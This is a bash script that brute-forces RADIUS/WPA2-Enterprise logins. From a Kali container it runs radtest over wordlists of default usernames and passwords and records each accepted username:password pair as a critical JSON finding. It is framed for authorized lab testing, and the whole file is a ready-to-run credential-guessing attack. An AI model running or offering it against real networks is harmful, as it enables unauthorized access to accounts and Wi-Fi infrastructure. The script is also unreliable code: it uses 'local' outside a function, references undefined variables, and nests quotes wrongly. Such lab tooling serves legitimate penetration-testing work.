#!/bin/bash
# Script for simulating WPA2-Enterprise / RADIUS brute-force attacks
# WARNING: Only use in authorized lab environments and with explicit permission

KALI_CONTAINER="pentest-kali"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${OUTPUT_DIR}/wifi_brute_force_${TIMESTAMP}.log"
BRUTE_FORCE_FINDINGS_JSON="${OUTPUT_DIR}/brute_force_findings_${TIMESTAMP}.json"

# Default values - these should be configured based on the lab setup
RADIUS_SERVER_IP=${1:-"172.21.0.X"} # Placeholder IP for RADIUS server in DMZ network
RADIUS_SECRET=${2:-"schoolradius123"} # RADIUS shared secret
USER_LIST=${3:-"/usr/share/wordlists/metasploit/http_default_user.txt"} # Common username list
PASS_LIST=${4:-"/usr/share/wordlists/metasploit/http_default_pass.txt"} # Common password list

echo "=========================================="
echo "WPA2-Enterprise / RADIUS Brute-Force Test"
echo "Timestamp: $TIMESTAMP"
echo "Target RADIUS Server: $RADIUS_SERVER_IP"
echo "=========================================="
echo ""
echo "⚠️  WARNING: This script performs brute-force attacks."
echo "   Only use in authorized lab environments!"
echo ""

# Ensure output directory exists
docker exec "$KALI_CONTAINER" mkdir -p "$OUTPUT_DIR"
docker exec "$KALI_CONTAINER" bash -c "echo '[]' > ${BRUTE_FORCE_FINDINGS_JSON}" # Initialize JSON array
docker exec "$KALI_CONTAINER" bash -c "echo 'RADIUS Brute-Force Test Report - ${TIMESTAMP}' > ${LOG_FILE}"

echo "Results will be logged in Kali container at: $LOG_FILE"
echo "JSON findings will be written to Kali container at: $BRUTE_FORCE_FINDINGS_JSON"
echo "Attempting to brute-force RADIUS authentication using radtest..." | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "User List: $USER_LIST" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "Pass List: $PASS_LIST" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"

# Install radtest if not present (radtest is part of freeradius-utils)
docker exec "$KALI_CONTAINER" bash -c "
    if ! command -v radtest &> /dev/null; then
        echo 'radtest not found. Installing freeradius-utils...' | tee -a "${LOG_FILE}"
        apt-get update -qq && apt-get install -y -qq freeradius-utils 2>&1 | tee -a "${LOG_FILE}" || true
    fi
"

SUCCESSFUL_ATTEMPTS=0

# Loop through usernames and passwords
# Note: This is a basic example. For real-world attacks, tools like 'Patator' or 'Hydra' are more efficient.
# However, 'radtest' provides a direct way to test FreeRADIUS authentication.
for user in $(docker exec "$KALI_CONTAINER" cat "$USER_LIST" 2>/dev/null); do
    if [ -z "$user" ]; then continue; fi
    for pass in $(docker exec "$KALI_CONTAINER" cat "$PASS_LIST" 2>/dev/null); do
        if [ -z "$pass" ]; then continue; fi

        echo "  Testing User: '$user', Pass: '$pass'" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
        
        # radtest command: radtest <user> <password> <radius_server> <nas_port> <radius_secret>
        # Using NAS port 0 for generic testing
        RADTEST_OUTPUT=$(docker exec "$KALI_CONTAINER" radtest "$user" "$pass" "$RADIUS_SERVER_IP" 0 "$RADIUS_SECRET" 2>&1)
        
        echo "$RADTEST_OUTPUT" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"

        # Check for successful authentication (FreeRADIUS's radtest outputs "Access-Accept")
        if echo "$RADTEST_OUTPUT" | grep -q "Access-Accept"; then
            echo "  [SUCCESS] Found valid credentials: User='$user', Pass='$pass'" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
            SUCCESSFUL_ATTEMPTS=$((SUCCESSFUL_ATTEMPTS + 1))
            
            local json_finding=$(cat <<JSON_EOF
{
  "id": "$(uuidgen | tr -d '-')",
  "timestamp": "$current_timestamp",
  "finding_type": "brute_force_success",
  "severity": "critical",
  "target": "$RADIUS_SERVER_IP",
  "target_ip": "$RADIUS_SERVER_IP",
  "port": 1812,
  "protocol": "udp",
  "service": "RADIUS",
  "description": "Successful RADIUS authentication via brute-force using credentials $user:$pass.",
  "username": "$user",
  "password": "$pass",
  "evidence": "$(echo "$RADTEST_OUTPUT" | sed 's/"/\\"/g' | tr -d '\n')"
}
JSON_EOF
)
            docker exec "$KALI_CONTAINER" python3 -c "
import json
with open('${BRUTE_FORCE_FINDINGS_JSON}', 'r+') as f:
    data = json.load(f)
    data.append($json_finding)
    f.seek(0)
    json.dump(data, f, indent=2)
    f.truncate()
"
        fi
    done
done

echo "" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "RADIUS Brute-Force Test Complete!" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "Total successful authentications: $SUCCESSFUL_ATTEMPTS" | docker exec "$KALI_CONTAINER" tee -a "${LOG_FILE}"
echo "Review logs in Kali container at: $LOG_FILE"
echo "Review JSON findings in Kali container at: $BRUTE_FORCE_FINDINGS_JSON"
echo ""
echo "NOTE: This script's effectiveness is limited by the non-functional RADIUS server."
echo "Further adaptation will be required once the RADIUS server is operational."

# Copy JSON findings from Kali container to host findings directory
docker cp "$KALI_CONTAINER":"$BRUTE_FORCE_FINDINGS_JSON" "$LAB_DIR/findings/"
echo "JSON findings copied to host: $LAB_DIR/findings/$(basename "$BRUTE_FORCE_FINDINGS_JSON")"

